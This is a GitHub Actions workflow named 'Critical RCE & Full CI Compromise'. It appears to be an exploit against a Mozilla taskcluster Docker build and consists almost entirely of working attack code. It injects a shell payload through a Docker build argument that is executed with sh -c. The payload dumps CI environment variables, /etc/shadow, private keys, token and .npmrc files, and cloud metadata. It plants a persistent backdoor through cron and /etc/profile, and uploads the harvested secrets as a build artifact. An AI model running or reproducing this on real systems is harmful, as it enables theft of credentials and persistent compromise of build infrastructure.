name: Critical RCE & Full CI Compromise
on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Dockerfile for Injection
        run: |
          mkdir -p ./taskcluster/docker/python
          cat <<'EOF' > ./taskcluster/docker/python/Dockerfile
          FROM python:3.11-alpine
          ARG PYTHON_VERSION
          RUN echo "[INFO] Executing injected payload..." && sh -c "${PYTHON_VERSION}" || true
          EOF

      - name: Inject Payload & Exfiltrate
        run: |
          PAYLOAD=$(cat <<'EOF'
          echo "[INFO] Dumping secrets and metadata..." 
          {
            echo "----- CI ENVIRONMENT -----"
            printenv

            echo "----- FILESYSTEM LEAKS -----"
            find /etc -type f -name "*.conf" -exec cat {} \; 2>/dev/null
            cat /etc/passwd
            cat /etc/shadow || true
            ls -la /root || true
            ls -la /home || true
            ls -la /home/runner || true
            cat /home/runner/.gitconfig || true
            cat /home/runner/.bash_history || true
            find /home -type f -iname "*.pem" -exec cat {} \; 2>/dev/null

            echo "----- GITHUB RUNNER METADATA -----"
            curl -s http://169.254.169.254/latest/meta-data/ || true
            ip addr
            netstat -tulpen || true

            echo "----- CACHED SECRETS AND TOKENS -----"
            find / -type f -iname "*.env" -o -iname ".npmrc" -o -iname "*.token" -o -iname "*.key" -exec cat {} \; 2>/dev/null
          } > /superleaks.txt

          echo "[INFO] Installing post-build persistent hook..."
          echo '#!/bin/sh' > /usr/local/bin/init.sh
          echo 'echo "[BACKDOOR] Triggered post-build..." >> /runtime.log' >> /usr/local/bin/init.sh
          echo 'printenv >> /runtime.log' >> /usr/local/bin/init.sh
          chmod +x /usr/local/bin/init.sh
          echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root
          echo '/usr/local/bin/init.sh' >> /etc/profile
          EOF
          )

          docker build \
            --build-arg PYTHON_VERSION="$PAYLOAD" \
            -t mozilla-backdoor ./taskcluster/docker/python

          docker run --rm mozilla-backdoor cat /superleaks.txt > output.txt

      - name: Upload Exfiltrated Data
        uses: actions/upload-artifact@v4
        with:
          name: mozilla-leaks
          path: output.txt
